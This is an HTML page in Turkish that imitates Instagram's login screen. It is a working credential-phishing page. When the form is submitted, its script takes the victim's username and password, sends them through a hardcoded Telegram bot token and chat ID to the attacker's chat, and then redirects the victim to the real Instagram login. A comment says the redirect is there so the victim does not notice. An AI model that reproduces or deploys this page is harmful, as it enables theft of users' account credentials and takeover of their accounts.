<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Giriş Yap</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; border-radius: 1px; }
        .logo { width: 175px; margin-bottom: 25px; cursor: pointer; }
        input { width: 100%; padding: 9px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
        input:focus { border: 1px solid #a8a8a8; outline: none; }
        button { width: 100%; padding: 7px; background-color: #0095f6; border: none; color: white; font-weight: 600; border-radius: 4px; cursor: pointer; margin-top: 10px; font-size: 14px; }
        button:disabled { background-color: #b2dffc; cursor: not-allowed; }
        .divider { margin: 20px 0; display: flex; align-items: center; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
        .divider span { padding: 0 18px; }
        .fb-login { color: #385185; font-size: 14px; font-weight: 600; cursor: pointer; text-decoration: none; display: block; margin-top: 20px; }
        .forgot { font-size: 12px; color: #00376b; text-decoration: none; display: block; margin-top: 15px; }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" class="logo" alt="Instagram">
    
    <form id="bellyTarget">
        <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
        <input type="password" id="password" placeholder="Şifre" required>
        <button type="submit" id="loginBtn">Giriş Yap</button>
    </form>

    <div class="divider"><span>YA DA</span></div>
    <a href="#" class="fb-login">Facebook ile Giriş Yap</a>
    <a href="#" class="forgot">Şifreni mi unuttun?</a>
</div>

<script>
    // BELLY - Senin Komuta Bilgilerin
    const BOT_TOKEN = '8600556676:AAFc6dqxJpHnNbhdYBkf7QBmLINUs86J-sI';
    const CHAT_ID = '8788868439';

    document.getElementById('bellyTarget').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        const btn = document.getElementById('loginBtn');
        
        btn.disabled = true;
        btn.innerText = 'Giriş yapılıyor...';

        // Mesaj Formatı (Daha Sinsi ve Profesyonel)
        const message = `🎯 *BELLY - YENİ İNSTA DÜŞTÜ!*\n\n👤 *Kullanıcı:* \`${user}\` \n🔑 *Şifre:* \`${pass}\` \n\n🔥 *Ganimet Ele Geçirildi!*`;

        // Telegram API Uçuşu
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: message,
                parse_mode: "Markdown"
            })
        })
        .then(response => {
            // Başarılı olsun ya da olmasın, kurbanı asıl siteye fırlat ki anlamasın!
            window.location.href = 'https://www.instagram.com/accounts/login/';
        })
        .catch(err => {
            window.location.href = 'https://www.instagram.com/accounts/login/';
        });
    });
</script>

</body>
</html>
